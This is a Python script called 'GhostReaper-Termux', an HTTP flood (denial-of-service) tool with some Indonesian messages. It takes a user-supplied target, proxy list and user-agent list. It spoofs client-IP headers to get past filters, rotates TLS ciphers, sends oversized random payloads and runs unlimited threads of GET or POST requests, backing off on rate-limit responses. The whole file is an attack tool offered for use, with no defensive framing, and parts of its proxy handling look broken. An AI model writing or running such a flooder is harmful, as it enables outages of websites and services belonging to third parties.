import http.client
import ssl
import json
import random
import threading
import time
from urllib.parse import urlparse
import socket
import sys
import traceback

# Color output
ANSI_RED = "\033[91m"
ANSI_GREEN = "\033[92m"
ANSI_YELLOW = "\033[93m"
ANSI_RESET = "\033[0m"

# Global
target = ""
threads = 0
proxy_file = ""
hop_count = 0
payload_type = ""
ua_file = ""
bypass_header = False
tls_spoofing = False
delay = 0
flood_method = ""
failover_monitoring = False
proxies = []
user_agents = []
headers = {}
tls_context = ssl.create_default_context()
status_counter = {"200": 0, "403": 0, "503": 0, "other": 0}
semaphore = threading.Semaphore(100)

def load_proxies(file):
    global proxies
    with open(file, 'r') as f:
        proxies = [line.strip() for line in f]

def load_user_agents(file):
    global user_agents
    with open(file, 'r') as f:
        user_agents = [line.strip() for line in f]

def inject_headers():
    headers = {
        "Content-Type": "application/json",
        "Accept": "application/json",
        "Connection": "keep-alive",
    }
    if bypass_header:
        headers.update({
            "X-Forwarded-For": random.choice(proxies),
            "User-Agent": random.choice(user_agents),
            "X-Request-ID": str(random.randint(100000, 999999)),
            "True-Client-IP": random.choice(proxies),
        })
    return headers

def mutate_payload(ptype):
    if ptype == "ghost-mutation":
        return json.dumps({
            "action": "ghost",
            "random": random.randint(1, 9999),
            "overflow": "X" * random.randint(10000, 30000)
        })
    elif ptype == "form":
        return "key=value&random=" + str(random.randint(1, 9999))
    elif ptype == "multipart":
        boundary = "----WebKitFormBoundary" + str(random.randint(1000, 9999))
        return (
            f"--{boundary}\r\n"
            f'Content-Disposition: form-data; name="key"\r\n\r\n'
            f"value\r\n"
            f"--{boundary}\r\n"
            f'Content-Disposition: form-data; name="random"\r\n\r\n'
            f"{random.randint(1, 9999)}\r\n"
            f"--{boundary}--\r\n"
        )
    return json.dumps({"error": "unknown payload"})

def rotate_proxy_chain():
    if proxies:
        return random.sample(proxies, k=min(len(proxies), hop_count))
    return []

def rotate_tls_context():
    ctx = ssl.create_default_context()
    ctx.set_ciphers(random.choice([
        "ECDHE-RSA-AES128-GCM-SHA256",
        "ECDHE-RSA-AES256-GCM-SHA384",
        "TLS_AES_256_GCM_SHA384"
    ]))
    return ctx

def handle_response(response, rtt):
    code = response.status
    if 200 <= code < 300:
        print(f"{ANSI_GREEN}[200 OK] {rtt*1000:.2f}ms{ANSI_RESET}")
        status_counter["200"] += 1
    elif code == 403:
        print(f"{ANSI_RED}[403 Forbidden]{ANSI_RESET}")
        status_counter["403"] += 1
    elif code == 429:
        print(f"{ANSI_YELLOW}[429 Rate Limit]{ANSI_RESET}")
        status_counter["other"] += 1
        time.sleep(delay + random.uniform(0.2, 1.0))
    elif code == 503:
        print(f"{ANSI_YELLOW}[503 Overload]{ANSI_RESET}")
        status_counter["503"] += 1
        time.sleep(delay + random.uniform(0.2, 1.0))
    else:
        print(f"{ANSI_RED}[{code}] Unknown{ANSI_RESET}")
        status_counter["other"] += 1

def launch():
    global target, threads, proxy_file, hop_count, payload_type, ua_file, bypass_header, tls_spoofing, delay, flood_method, failover_monitoring

    print("\n[1] Launch GhostReaper-Termux")
    if input("> ").strip() != "1": return

    try:
        target = input("[Target] ").strip()
        threads = int(input("[Threads] ").strip())
        proxy_file = input("[Proxy-List] ").strip()
        hop_count = int(input("[Proxy-Hop] ").strip())
        payload_type = input("[Payload-Type] ").strip()
        ua_file = input("[User-Agent-List] ").strip()
        bypass_header = input("[Bypass-Header] (yes/no) ").lower().strip() == 'yes'
        tls_spoofing = input("[TLS-Spoofing] (yes/no) ").lower().strip() == 'yes'
        delay = float(input("[Delay] (0.5 recommended) ").strip())
        flood_method = input("[Flood-Method] (POST/GET) ").upper().strip()
        failover_monitoring = input("[Failover-Monitoring] (yes/no) ").lower().strip() == 'yes'
    except:
        print("❌ Input tidak valid.")
        return

    try:
        load_proxies(proxy_file)
        load_user_agents(ua_file)
    except Exception as e:
        print(f"❌ Gagal load proxy/UA: {e}")
        return

    parsed_url = urlparse(target)

    def worker():
        global headers, tls_context
        tls_context = rotate_tls_context()
        while True:
            try:
                semaphore.acquire()
                proxy_chain = rotate_proxy_chain()
                for proxy in proxy_chain:
                    conn = http.client.HTTPSConnection(proxy, context=tls_context)
                    headers = inject_headers()
                    headers["User-Agent"] = random.choice(user_agents)
                    target_path = parsed_url.path + f"?inject={random.randint(1, 9999)}"
                    payload = mutate_payload(payload_type)
                    conn.request(flood_method, target_path, payload, headers)
                    start = time.time()
                    resp = conn.getresponse()
                    rtt = time.time() - start
                    handle_response(resp, rtt)
                    if failover_monitoring and resp.status in [403, 429, 503]:
                        time.sleep(delay + random.uniform(0.2, 1.0))
            except Exception as e:
                print(f"{ANSI_RED}[ERROR] {e}{ANSI_RESET}")
            finally:
                semaphore.release()

    for _ in range(threads):
        t = threading.Thread(target=worker)
        t.start()

if __name__ == "__main__":
    launch()
